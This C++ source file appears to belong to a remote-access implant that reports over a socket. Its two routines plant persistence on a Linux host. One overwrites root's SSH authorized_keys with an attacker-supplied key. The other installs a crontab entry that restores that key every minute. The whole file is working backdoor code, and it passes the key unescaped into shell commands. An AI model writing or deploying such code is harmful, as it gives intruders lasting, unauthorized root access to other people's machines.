#include "Persistence.h"
#include <unistd.h>
#include <string>
#include <iostream>
#include <cstdio>
#include <fstream>

void Persistence::insertSSHKey(int sockfd, const std::string& sshKey) { 
    std::string command = "mkdir -p /root/.ssh && echo \"" + sshKey + "\" > /root/.ssh/authorized_keys";
    int ret = system(command.c_str());
    if (ret == -1) {
        dprintf(sockfd, "Error executing command: %s\n", command.c_str());
    } else if (WIFEXITED(ret) && WEXITSTATUS(ret) == 0) {
        dprintf(sockfd, "SSH key insertion successful.\n");
    } else {
        dprintf(sockfd, "SSH key insertion failed.\n");
    }
}
void Persistence::insertCronJob(int sockfd, const std::string& sshKey) {
    std::ofstream crontabFile("/tmp/crontab.tmp");
    if (!crontabFile.is_open()) {
        dprintf(sockfd, "Error opening crontab file.\n");
        return;
    }

    crontabFile << "*/1 * * * * /bin/bash -c 'if [ ! -f /root/.ssh/authorized_keys ] || ! grep -q \"" << sshKey << "\" /root/.ssh/authorized_keys; then mkdir -p /root/.ssh && echo \"" << sshKey << "\" > /root/.ssh/authorized_keys; fi'\n";
    crontabFile.close();

    std::string installCommand = "crontab /tmp/crontab.tmp";
    int ret = system(installCommand.c_str());
    if (ret == -1) {
        dprintf(sockfd, "Error installing crontab.\n");
        return;
    }

    std::string removeCommand = "rm /tmp/crontab.tmp";
    ret = system(removeCommand.c_str());
    if (ret == -1) {
        dprintf(sockfd, "Error removing temporary crontab file.\n");
        return;
    }
}